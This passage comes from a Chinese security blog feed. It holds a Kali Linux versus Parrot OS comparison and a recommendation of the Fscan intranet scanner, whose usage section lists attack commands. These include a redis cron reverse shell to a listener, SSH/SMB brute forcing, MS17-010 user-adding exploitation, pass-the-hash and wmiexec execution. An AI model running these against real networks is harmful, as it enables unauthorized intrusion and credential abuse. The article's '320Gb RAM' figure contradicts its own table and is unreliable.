href="https://github.com/x364e3ab6/DudeSuite/releases/download/v1.4.0.7/DudeSuite_Latest_Win.zip">点击下载（Github）</a></p><p><a href="http://update.dudesuite.cn:8530/DudeSuite_Latest_Win.zip">点击下载（DudeSuite）</a></p><h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><p>Windows10 1709、Windows Server 1709 .net framework 4.7.2 版本及以上。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 与 Parrot OS：哪个渗透测试发行版最好？</title>
      <link href="/2024/03/21/21-Kali%20Linux%20%E4%B8%8E%20Parrot%20OS%EF%BC%9A%E5%93%AA%E4%B8%AA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%80%E5%A5%BD%EF%BC%9F/"/>
      <url>/2024/03/21/21-Kali%20Linux%20%E4%B8%8E%20Parrot%20OS%EF%BC%9A%E5%93%AA%E4%B8%AA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%80%E5%A5%BD%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="Kali-Linux-与-Parrot-OS：哪个渗透测试发行版最好？"><a href="#Kali-Linux-与-Parrot-OS：哪个渗透测试发行版最好？" class="headerlink" title="Kali Linux 与 Parrot OS：哪个渗透测试发行版最好？"></a>Kali Linux 与 Parrot OS：哪个渗透测试发行版最好？</h1><p>您是否正在尝试选择使用哪种道德黑客或注重安全的 Linux 发行版？Kali Linux 和 Parrot OS 是为此目的而设计的两个最好的 Linux 发行版。它们都是免费的，并且为安全专业人士预装了大量软件，但您知道它们之间的区别吗？</p><p>本文将研究这两个版本的 Linux、它们的易用性、它们附带的工具以及它们的性能。我们将比较他们在某些领域的优势和劣势，并突出一个人相对于另一个人的优势。</p><p>通过本文的结论，您将深入了解 Kali Linux 与 Parrot OS，并能够决定哪一个最适合您。</p><h2 id="关于操作系统"><a href="#关于操作系统" class="headerlink" title="关于操作系统"></a>关于操作系统</h2><p>Kali Linux 和 Parrot OS 都是基于 Debian 的 Linux 发行版，面向安全专业人士。Debian 是最古老、使用最广泛、最稳定的 Linux 发行版之一，其第一个版本可以追溯到 1993 年。由于 Kali 和 Parrot OS 的预期用途是针对安全专业人员，特别是黑客，因此它们有许多相同的功能。尽管如此，它们之间的关键差异可能会使它们更适合某些任务。</p><h3 id="什么是-Kali-Linux？"><a href="#什么是-Kali-Linux？" class="headerlink" title="什么是 Kali Linux？"></a>什么是 Kali Linux？</h3><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/1.-What-is-Kali-Linux.png" alt="什么是 Kali Linux"></p><p><a href="https://www.kali.org/get-kali/">Kali Linux</a>是一个备受推崇的发行版，由<a href="https://www.offsec.com/">OffSec</a>（以前称为 Offective Security）资助和开发。他们是一家网络安全公司，还提供行业标准资格，例如著名的<a href="https://www.stationx.net/ceh-vs-oscp/">OffSec 认证专业人员 (OSCP)</a>、OffSec 经验丰富的渗透测试人员 (OSEP) 等等。这一血统是许多安全专业人员使用 Kali 进行渗透测试、数字取证和其他相关活动的原因之一。</p><p>Kali 的第一个版本于 2013 年发布，是已停止开发的 BackTrack 发行版的重新打包。BackTrack 包含数百个预打包工具，但因难以使用且不可靠而闻名。Kali 解决了这些弱点，成为许多专业人士使用的首选工具集，并持续定期改进和更新。 </p><h3 id="什么是-Parrot-操作系统？"><a href="#什么是-Parrot-操作系统？" class="headerlink" title="什么是 Parrot 操作系统？"></a>什么是 Parrot 操作系统？</h3><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/2.-What-is-Parrot-OS.png" alt="什么是 Parrot 操作系统"></p><p><a href="https://www.parrotsec.org/download/">Parrot OS</a>与 Kali 一样，是一个 Linux 发行版，它预先打包了一些可以帮助安全专业人员工作的工具。然而，它是一个社区驱动的项目，由爱好者和行业专家维护和支持。 </p><p>它们最初被称为 FrozenBox，但自 2017 年以来，目前的独立开发人员团队一直由 Lorenzo Faletra 领导。Parrot OS 专注于渗透测试、数字取证和隐私，并在发行版中预装了用于这些任务的工具和应用程序。</p><p>与 Kali 类似，BackTrack 启发了 Parrot OS，该团队希望创建一个新的发行版来继承 BackTrack 的使命。Parrot OS虽然只有一个小型的开发团队，但它持续不断地更新和改进，是安全行业中流行的Linux发行版。</p><p><strong>想要下载我们所有的高级备忘单吗？</strong></p><p>没问题！只需输入您的电子邮件地址，我们就会向您发送所有热门备忘单的 PDF 版本。</p><p><strong>下载 →</strong></p><h2 id="用户体验"><a href="#用户体验" class="headerlink" title="用户体验"></a>用户体验</h2><p>Kali Linux 和 Parrot OS 的主要关注点是安全专业人士，但这并不意味着它们不能看起来有吸引力、易于使用且性能良好。这两个发行版的用户体验如何相互比较？</p><h3 id="卡利体验"><a href="#卡利体验" class="headerlink" title="卡利体验"></a>卡利体验</h3><p>对于任何使用过最新 Debian Linux 发行版的人来说，Kali Linux 的初始体验都会很熟悉。一切都是合乎逻辑且直观的，并且很容易找到解决办法。就连命令行也充满了色彩。</p><p>当进一步深入菜单时，大量的预装工具就会变得显而易见。如果您没有使用所有这些工具的经验，这可能会让人望而生畏，但它们按类别进行组织，以便于查找。您可以通过菜单顶部的搜索框快速找到您需要的工具。</p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/3.-The-Kali-Experience.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/3.-The-Kali-Experience.jpg" alt="卡利体验"></a></p><p>安装 Kali 时可以选择 XfCE、GNOME 或 KDE Plasma 图形桌面环境，但大多数人会使用默认值，即 XfCE。这些选项在默认为 XfCE 的实时映像中不可用。这是一个轻量级且直观的环境，有效地消除了对旧“Kali Lite”发行版的需求。 </p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/4.-Kali-Software-Selection.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/4.-Kali-Software-Selection.jpg" alt="Kali软件选型"></a></p><p>Kali 最近将默认 shell 从 Bash (Bourne-Again Shell) 切换为 Zsh (Z Shell)。尽管 Bash 长期以来一直是许多 Linux 发行版的默认 shell，但 Zsh 提供了更多功能和自定义功能，例如高级的基于上下文的自动完成和键盘快捷键。由于 Kali 中的许多工具都是从命令行运行的，因此 Zsh 是一个非常好用的 shell，可以使在此环境中的工作更加高效。</p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/5.-Linux-Distributions.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/5.-Linux-Distributions.jpg" alt="Linux 发行版"></a></p><p>Kali 专注于用于渗透测试和数字取证的工具，没有预装任何办公或媒体应用程序。这些可以手动安装，但 Kali 的性质意味着不建议将其用于通用操作系统。 </p><p>您将运行的某些工具需要 root 访问权限，并且经常会导致不稳定以及需要重新安装或恢复到快照。Kali 的最新版本提高了稳定性，因为默认用户不再是 root，并且此级别的访问需要 sudo 权限升级。 </p><p>运行 Kali 的一种流行方式是作为更稳定的主机（例如 Ubuntu、Windows 或 macOS）上的虚拟机，或者作为可启动 USB 驱动器。当以这种方式使用时，操作系统的损坏不会那么灾难性，并且恢复会更快。</p><p>与大多数 Linux 发行版一样，Kali 具有很强的可定制性。可以安装不同的桌面环境、添加工具以及轻松更改配置设置。然而，正如我们所提到的，大多数人使用标准配置，因为如果操作系统因使用导致损坏的工具而遇到问题，则重建时间可以保持在最低限度。 </p><h3 id="Parrot-操作系统体验"><a href="#Parrot-操作系统体验" class="headerlink" title="Parrot 操作系统体验"></a>Parrot 操作系统体验</h3><p>对于任何使用 Linux 的家庭来说，Parrot OS 都会感到熟悉。尽管如此，从第一次使用中就可以明显看出，开发人员创建了一个非常直观、灵活且视觉上令人愉悦的工作环境。与 Kali 相比，Parrot OS 感觉敏捷且能够快速响应您的输入，即使在相对普通的硬件上也是如此。</p><p>菜单系统组织得很好，工具按逻辑分类。与 Kali 一样，种类繁多的工具可能让人眼花缭乱。幸运的是，Parrot OS 还有一个方便的搜索框，可以帮助您找到所需的内容。熟悉布局并不需要很长时间。</p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/6.-The-Parrot-OS-Experience.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/6.-The-Parrot-OS-Experience.jpg" alt="Parrot 操作系统体验"></a></p><p>Parrot OS 使用 MATE 作为默认桌面环境，其性能和易用性与 XfCE 相当，但可定制性较差。这不是问题，因为大多数人会使用默认设置，而不关心审美变化，而是专注于使用工具。有些人可能会发现布局更直观，因为它是一个更简单的设计，但同样有效。</p><p>安装Parrot OS时无法选择桌面环境。相反，一旦新环境启动并运行，就需要安装它。一个流行的选择是 XfCE，但 MATE 并不缺少任何关键的东西，所以这完全取决于您的偏好。</p><p>Parrot OS 默认使用常见的 BASH shell。尽管不如 Kali 中使用的 Zsh shell 先进，但它仍然提供了许多出色的功能，可以提高使用效率。它具有自动完成、颜色编码和自定义功能，可帮助运行命令行工具。大多数安全专业人员都对 BASH 感到满意，但如果需要额外的功能，可以安装 Zsh。 </p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/7.-BASH-shell.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/7.-BASH-shell.jpg" alt="bash外壳"></a></p><p>Parrot OS 预装了许多与渗透测试和数字取证相关的工具，但它还具有一些出色的隐私、匿名和加密功能。这些功能使其与 Kali 区分开来，并表明它被设计为更多地用作希望保护数据并保持隐私的安全专业人员的日常操作系统。</p><p>Parrot OS 预装了 Office 和媒体工具。虽然这些都是基础的，但如果需要的话，它确实开启了使用 Parrot OS 作为通用操作系统的可能性。此功能是 Parrot OS 受欢迎的原因之一，并且使其成为更灵活的操作系统。还提供未预装安全工具的家庭版，这可能是更适合日常使用的操作系统。</p><p><a href="https://www.stationx.net/wp-content/uploads/2023/04/8.-Pre-installed-with-many-tools.jpg"><img src="https://www.stationx.net/wp-content/uploads/2023/04/8.-Pre-installed-with-many-tools.jpg" alt="预装了许多工具"></a></p><p>由于 Parrot OS 基于 Debian，因此可高度定制，使您能够创建适合您需求的环境。不过，由于Parrot OS的默认安装配置非常好，并且经常在实际环境中运行，因此大多数人没有这个需求。</p><table><thead><tr><th><strong>卡利语</strong></th><th><strong>鹦鹉</strong></th></tr></thead><tbody><tr><td>Xfce环境</td><td>伴侣环境</td></tr><tr><td>ZSH Shell高级选项卡完成主题和插件高级定制大型活跃社区</td><td>Bash Shell 标准制表符补全Linux 标准 Shell 兼容性熟悉</td></tr><tr><td>很好的表现</td><td>性能非常快</td></tr><tr><td>没有办公或媒体工具</td><td>办公和基本媒体工具</td></tr><tr><td>图形用户界面和命令行</td><td>图形用户界面和命令行</td></tr><tr><td>有些工具可能会导致系统崩溃</td><td>有些工具可能会导致系统崩溃</td></tr><tr><td>可定制</td><td>可定制</td></tr></tbody></table><h2 id="系统要求和性能"><a href="#系统要求和性能" class="headerlink" title="系统要求和性能"></a>系统要求和性能</h2><p>Linux 因在普通硬件上运行良好且运行方式灵活而享有盛誉。由于 Kali Linux 和 Parrot OS 基于流行的 Debian 发行版，因此它们也不例外，并且可以在各种旧平台上愉快地运行。Kali 和 Parrot OS 的性能有区别吗？请仔细阅读，找出答案。</p><p><strong>想要下载我们所有的高级备忘单吗？</strong></p><p>没问题！只需输入您的电子邮件地址，我们就会向您发送所有热门备忘单的 PDF 版本。</p><p><strong>下载 →</strong></p><h3 id="运行-Kali-Linux"><a href="#运行-Kali-Linux" class="headerlink" title="运行 Kali Linux"></a>运行 Kali Linux</h3><p>Kali Linux 将在相当低规格的硬件上运行，仅需要 20Gb 硬盘空间、2Gb RAM 和 i3 或 AMD E1 双核处理器。一般任务在最低规格下表现良好，但如果尝试密集活动（例如密码破解），资源使用量可能会迅速增加，因此我们建议如果可能的话，使用高于最低规格的规格。</p><p>启动时间与 Linux 的其他发行版相当，整体性能足够，并且取决于可用的硬件资源。</p><p>Kali 专注于维护最新的工具和功能，并遵循滚动更新计划。这些更新可能会因其数量和频率而导致稳定性问题，因此可靠性一直是 Kali 的一个问题（尽管它们还没有致命到足以让人们远离该发行版）。 </p><p>安装 Kali Linux 的方法有很多种，包括从 ISO 完全安装到磁盘、与另一个操作系统双重启动或将<a href="https://www.stationx.net/how-to-install-kali-linux-on-virtualbox/">其安装为虚拟机</a>。它还可以作为针对不同虚拟环境的预打包虚拟机映像提供。这些可以简单地插入虚拟机主机并无需任何配置即可启动。这是在现有机器上快速测试或使用 Kali 的好方法。（<a href="https://www.stationx.net/best-laptops-for-kali-linux/">在这里了解最适合 Kali Linux 的笔记本电脑</a>。）</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/9.-Running-Kali-Linux.png" alt="运行 Kali Linux"></p><p>使用 ISO 映像，Kali Linux 还可以从实时 USB 设备启动。一些安全专业人员会在他们的工具包中携带实时 Kali USB 驱动器，以便他们可以在任何设备上启动并使用这些工具。如果你看过<a href="https://www.stationx.net/movies-for-hackers-to-watch/">机器人先生电视剧</a>，Eliot就是这样使用直播Kali U盘的。</p><h3 id="运行-Parrot-操作系统"><a href="#运行-Parrot-操作系统" class="headerlink" title="运行 Parrot 操作系统"></a>运行 Parrot 操作系统</h3><p>Parrot OS 受欢迎的原因之一是，相比之下，运行它的硬件要求非常小。它需要 1Ghz 双核 CPU，与 Kali 相同，但只有 320Gb RAM，并且没有图形加速。它可以在适度的硬件上顺利运行，但与任何操作系统一样，如果需要密集的任务，它将需要更多的资源。不过，即使在旧硬件上，整体性能也令人印象深刻。 </p><p>尽管 Parrot OS 与 Kali 有一些共同点，但它有更传统的更新时间表。Parrot OS 以其稳定性而闻名，在某种程度上，更新来自其自己的存储库，并经过兼容性和可靠性检查。但请注意，某些工具需要 root 访问权限才能运行，这可能会导致问题和损坏。在实时环境中运行 Parrot OS 是实现快速恢复的有效方法。</p><p>与 Kali 不同，Parrot OS 安全版仅作为 ISO 提供。它足够灵活，可以安装在裸机上，作为实时 USB 运行，或者作为虚拟机安装，但没有预打包的 VM 可用。这意味着在虚拟环境中运行它需要更多的准备和配置。这并不困难，但在两者之间进行选择时值得考虑额外的时间和精力。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/10.-Security-Edition.jpg" alt="安全版"></p><table><thead><tr><th><strong>卡利Linux</strong></th><th><strong>鹦鹉操作系统</strong></th></tr></thead><tbody><tr><td>1Ghz单核CPU（推荐2Ghz双核）</td><td>1Ghz双核CPU</td></tr><tr><td>1 Gb RAM（推荐 2Gb RAM）</td><td>320 Mb RAM（推荐 2Gb RAM）</td></tr><tr><td>不需要图形加速</td><td>不需要图形加速</td></tr><tr><td>20Gb硬盘空间</td><td>16 GB 硬盘空间</td></tr><tr><td>很好的表现</td><td>很好的表现;很好的绩效</td></tr><tr><td>灵活的安装选项</td><td>安装选项不那么灵活</td></tr><tr><td>一些可靠性问题</td><td>稳定性和可靠性好。</td></tr></tbody></table><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Kali Linux 和 Parrot OS 预配置了<a href="https://www.stationx.net/penetration-testing-tools-for-kali-linux/">600 多种针对安全专业人士的工具</a>。尽管其中许多工具存在重复，但仍存在值得考虑的差异。</p><h3 id="Kali-Linux-工具"><a href="#Kali-Linux-工具" class="headerlink" title="Kali Linux 工具"></a>Kali Linux 工具</h3><p>Kali Linux 预装了 600 多个工具。这些主要针对渗透测试并分为几类。有些工具出现在多个菜单中，因为它们具有多种用途，并且可以相应地进行分类。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/11.-Kali-Linux-Tools.png" alt="Kali Linux 工具"></p><h3 id="Parrot-操作系统工具"><a href="#Parrot-操作系统工具" class="headerlink" title="Parrot 操作系统工具"></a>Parrot 操作系统工具</h3><p>Parrot OS 预装了与 Kali 类似的工具集，但包含有助于加密、隐私和匿名的应用程序，这使其与 Kali 区分开来。菜单系统的工具组织良好且易于查找。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/12.-Parrot-OS-Tools.png" alt="Parrot 操作系统工具"></p><h2 id="支持"><a href="#支持" class="headerlink" title="支持"></a>支持</h2><h3 id="卡利支持"><a href="#卡利支持" class="headerlink" title="卡利支持"></a>卡利支持</h3><p>由于 Kali 基于 Debian，因此它使用标准的 APT 包管理器进行更新和升级。它是一个命令行工具，但易于使用并且很快就会熟悉。 </p><p>社区为 Kali 提供的支持非常出色且热情。Kali 被许多安全专业人士认为是行业标准渗透工具集，而且这种声誉多年来不断增长，用户群不断增加。</p><p><a href="https://www.kali.org/docs/">Kali 的文档非常丰富，可以在OffSec 网站</a>上找到。它通过非常深入的文章涵盖了从安装到开发的所有内容。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/13.-Kali-Support.jpg" alt="卡利支持"></p><p><strong>想要下载我们所有的高级备忘单吗？</strong></p><p>没问题！只需输入您的电子邮件地址，我们就会向您发送所有热门备忘单的 PDF 版本。</p><p><strong>下载 →</strong></p><h3 id="Parrot-操作系统支持"><a href="#Parrot-操作系统支持" class="headerlink" title="Parrot 操作系统支持"></a>Parrot 操作系统支持</h3><p>Parrot OS 也基于 Debian，并使用 APT 作为软件包和更新管理器。它的工作方式与 Kali 相同，是一种可靠且简单的安装和更新软件包的方法。 </p><p>Parrot OS 得到了社区的良好支持；它是一个基于社区的项目，这很适合这一点。它自 2013 年推出以来，已经获得了忠实的追随者，但其支持程度无法与 Kali Linux 相比。</p><p>为 Parrot OS 提供的文档可以在<a href="https://parrotsec.org/docs/">Parrot 网站</a>上找到。它表现得很好，也足够深入，很有价值。该文档涵盖了从安装到配置和云的许多主题，但不如 Kali 文档深入。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/14.-ParrotOS-Documentation.jpg" alt="ParrotOS 文档"></p><table><thead><tr><th><strong>卡利Linux</strong></th><th><strong>鹦鹉操作系统</strong></th></tr></thead><tbody><tr><td>优秀的社区支持</td><td>良好的社区支持</td></tr><tr><td>优秀的文档</td><td>良好的文档</td></tr></tbody></table><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>Kali Linux 和 Parrot OS 在很多方面都非常相似，但也有足够的差异，使每一种都适合不同的角色。 </p><p>Kali 是渗透测试工具集的黄金标准，提供最新、最好的工具并频繁更新。它拥有大多数任务所需的一切，并且可以轻松安装缺少的任何内容。然而，它相对消耗资源并且可能存在稳定性问题。</p><p>Parrot OS 虽然被一些人错误地认为是新来者，但它的历史和 Kali 一样悠久，并且自创建以来一直在不断发展。尽管与 Kali 相比，它在受欢迎程度上有所欠缺，但它以卓越的性能、更广泛的工具集和更直观的用户界面来弥补。它还受益于检查稳定性的适度更新，从而形成一个可能比 Kali 更可靠的稳定操作系统。</p><p>由于 Kali Linux 是行业标准安全专业人士的工具集，也是许多认证考试（例如 OSCP）所需的操作系统，因此我们强烈建议熟练使用它。</p><p>然而，Parrot OS 是一个很好的选择，它有自己出色的功能和独特的风格。它还拥有非常出色的性能和直观的环境，可以在其中学习行业工具。</p><p><img src="https://www.stationx.net/wp-content/uploads/2023/04/15.-How-Is-Kali-Linux-Different-to-Parrot-OS.png" alt="Kali Linux 与 Parrot OS 有何不同"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网工具推荐-Fscan-祝你横扫内网</title>
      <link href="/2024/03/20/40-%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90-Fscan-%E7%A5%9D%E4%BD%A0%E6%A8%AA%E6%89%AB%E5%86%85%E7%BD%91~/"/>
      <url>/2024/03/20/40-%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90-Fscan-%E7%A5%9D%E4%BD%A0%E6%A8%AA%E6%89%AB%E5%86%85%E7%BD%91~/</url>
      
        <content type="html"><![CDATA[<p>github链接:<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>giothub下载链接:<a href="https://github.com/shadow1ng/fscan/releases/tag/1.8.3">https://github.com/shadow1ng/fscan/releases/tag/1.8.3</a></p><p>中文版本:<a href="https://github.com/ChinaRan0/fscan-Chinese">https://github.com/ChinaRan0/fscan-Chinese</a>  #404师傅汉化</p><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。<br>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能.</p><h2 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2.主要功能"></a>2.主要功能</h2><h4 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集:"></a>1.信息搜集:</h4><ul><li>存活探测(icmp)</li><li>端口扫描</li></ul><h4 id="2-爆破功能"><a href="#2-爆破功能" class="headerlink" title="2.爆破功能:"></a>2.爆破功能:</h4><ul><li>各类服务爆破(ssh、smb、rdp等)</li><li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li></ul><h4 id="3-系统信息、漏洞扫描"><a href="#3-系统信息、漏洞扫描" class="headerlink" title="3.系统信息、漏洞扫描:"></a>3.系统信息、漏洞扫描:</h4><ul><li>netbios探测、域控识别</li><li>获取目标网卡信息</li><li>高危漏洞扫描(ms17010等)</li></ul><h4 id="4-Web探测功能"><a href="#4-Web探测功能" class="headerlink" title="4.Web探测功能:"></a>4.Web探测功能:</h4><ul><li>webtitle探测</li><li>web指纹识别(常见cms、oa框架等)</li><li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li></ul><h4 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用:"></a>5.漏洞利用:</h4><ul><li>redis写公钥或写计划任务</li><li>ssh命令执行</li><li>ms17017利用(植入shellcode),如添加用户等</li></ul><h4 id="6-其他功能"><a href="#6-其他功能" class="headerlink" title="6.其他功能:"></a>6.其他功能:</h4><ul><li>文件保存</li></ul><h2 id="3-使用说明"><a href="#3-使用说明" class="headerlink" title="3.使用说明"></a>3.使用说明</h2><p>简单用法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></tbody></table></figure><p>其他用法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></tbody></table></figure><p>编译命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go build -ldflags="-s -w " -trimpath main.go</span><br><span class="line">upx -9 fscan.exe (可选,压缩体积)</span><br></pre></td></tr></tbody></table></figure><p>arch用户安装<br><code>yay -S fscan-git  或者 paru -S fscan-git</code></p><p>完整参数</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">-c string</span><br><span class="line">      ssh命令执行</span><br><span class="line">-cookie string</span><br><span class="line">      设置cookie</span><br><span class="line">-debug int</span><br><span class="line">      多久没响应,就打印当前进度(default 60)</span><br><span class="line">-domain string</span><br><span class="line">      smb爆破模块时,设置域名</span><br><span class="line">-h string</span><br><span class="line">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class="line">-hf string</span><br><span class="line">      读取文件中的目标</span><br><span class="line">-hn string</span><br><span class="line">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class="line">-m string</span><br><span class="line">      设置扫描模式: -m ssh (default "all")</span><br><span class="line">-no</span><br><span class="line">      扫描结果不保存到文件中</span><br><span class="line">-nobr</span><br><span class="line">      跳过sql、ftp、ssh等的密码爆破</span><br><span class="line">-nopoc</span><br><span class="line">      跳过web poc扫描</span><br><span class="line">-np</span><br><span class="line">      跳过存活探测</span><br><span class="line">-num int</span><br><span class="line">      web poc 发包速率  (default 20)</span><br><span class="line">-o string</span><br><span class="line">      扫描结果保存到哪 (default "result.txt")</span><br><span class="line">-p string</span><br><span class="line">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")</span><br><span class="line">-pa string</span><br><span class="line">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class="line">-path string</span><br><span class="line">      fcgi、smb romote file path</span><br><span class="line">-ping</span><br><span class="line">      使用ping代替icmp进行存活探测</span><br><span class="line">-pn string</span><br><span class="line">      扫描时要跳过的端口,as: -pn 445</span><br><span class="line">-pocname string</span><br><span class="line">      指定web poc的模糊名字, -pocname weblogic</span><br><span class="line">-proxy string</span><br><span class="line">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class="line">-user string</span><br><span class="line">      指定爆破时的用户名</span><br><span class="line">-userf string</span><br><span class="line">      指定爆破时的用户名文件</span><br><span class="line">-pwd string</span><br><span class="line">      指定爆破时的密码</span><br><span class="line">-pwdf string</span><br><span class="line">      指定爆破时的密码文件</span><br><span class="line">-rf string</span><br><span class="line">      指定redis写公钥用模块的文件 